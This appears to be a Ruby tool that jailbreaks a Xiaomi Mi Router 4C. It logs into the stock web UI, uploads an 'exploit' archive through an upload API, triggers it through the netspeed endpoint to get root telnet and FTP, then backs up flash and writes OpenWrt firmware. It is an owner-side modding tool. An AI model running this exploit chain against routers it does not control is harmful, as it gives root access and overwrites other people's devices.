#!/usr/bin/ruby

require 'erb'
require 'json'
require 'digest'
require 'net/ftp'
require 'net/http'
require 'rubygems/package'

router_ip = '192.168.31.1'
password = 'adminadmin'
openwrt_firmware = 'targets/ramips/mt76x8/openwrt-ramips-mt76x8-xiaomi_mi-router-4c-squashfs-sysupgrade.bin'

puts "Connecting to #{router_ip}..."
http = Net::HTTP.new(router_ip, 80)

get_router = http.request(Net::HTTP::Get.new("/cgi-bin/luci/web"))
mac_address = get_router.body.match("deviceId = \'(.*?)\'").captures.first
nonce = "%d_%s_%i_%i" % [0, mac_address, Time.now, rand(0..10000)]
password_hash = Digest::SHA1.hexdigest(password + 'a2ffa5c9be07488bbb04a3a47d3c5f6a')
admin_password = Digest::SHA1.hexdigest(nonce + password_hash)
print "Logging in with password... "
login_post = Net::HTTP::Post.new("/cgi-bin/luci/api/xqsystem/login")
login_post.set_form_data({"username" => "admin", "password" => admin_password, "logtype" => "2", "nonce" => nonce})
login_post["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
login_request = http.request(login_post)
login_data = JSON.parse(login_request.body)
if login_data["code"] != 0
    puts "error!"
    puts login_data
    abort
else
    puts "success!"
end

print "Placing and executing the exploit... "
files = {
  "busybox" => IO.binread("exploit/busybox"),
  "main.sh" => IO.binread("exploit/main.sh"),
  "speedtest_urls.xml" => IO.binread("exploit/speedtest_urls.xml.tpl").gsub('ROUTER_IP',router_ip)
}
File.open("exploit.tar.gz", "wb") do |file|
  Zlib::GzipWriter.wrap(file) do |gzip|
    Gem::Package::TarWriter.new(gzip) do |tar|
      files.each_pair do |filename, content|
        tar.add_file_simple(filename, 0644, content.length) do |io|
          io.write(content)
        end
      end
    end
  end
end

upload_post = Net::HTTP::Post.new("/cgi-bin/luci/;stok=#{login_data["token"]}/api/misystem/c_upload")
upload_post.set_form([["image", File.new("exploit.tar.gz", "rb")]], 'multipart/form-data')
upload_request = http.request(upload_post)
puts "done."
start_script = http.request(Net::HTTP::Get.new("/cgi-bin/luci/;stok=#{login_data["token"]}/api/xqnetdetect/netspeed"))
puts "Netspeed results:\n#{start_script.body}"

puts "Backing up current mtd contents..."
def send_cmd (socket, command, cmd_string = "XiaoQiang:~#")
  socket.write command+"\r\n"
  buffer = ""
  while not (buffer.include? cmd_string)
    buffer += socket.recv(1024)
  end
  return buffer
end
socket = TCPSocket.open(router_ip, 23)
sleep 0.5
socket.flush
send_cmd socket, "root"
puts send_cmd socket, "dd if=/dev/mtd0 of=/tmp/backup.bin"

print "Getting mtd backup and uploading OpenWRT firmware... "
Net::FTP.open(router_ip) do |ftp|
  ftp.login
  ftp.chdir('/tmp')
  ftp.list
  ftp.getbinaryfile('backup.bin', 'backup.bin', 1024)
  ftp.putbinaryfile(openwrt_firmware, 'openwrt.bin', 1024)
end
puts "done."

puts "Flashing OpenWRT firmware..."
puts send_cmd socket, "mtd write /tmp/openwrt.bin OS1"
send_cmd socket, "reboot"
puts "Flashing finished!"
puts
puts "Now wait for your router to finish flashing (it could take about 3-4 minutes),\nreboot (the LED color will change to orange) and stop blinking,\nthen change your NIC IP address to 192.168.1.2."
puts "Open http://192.168.1.1"
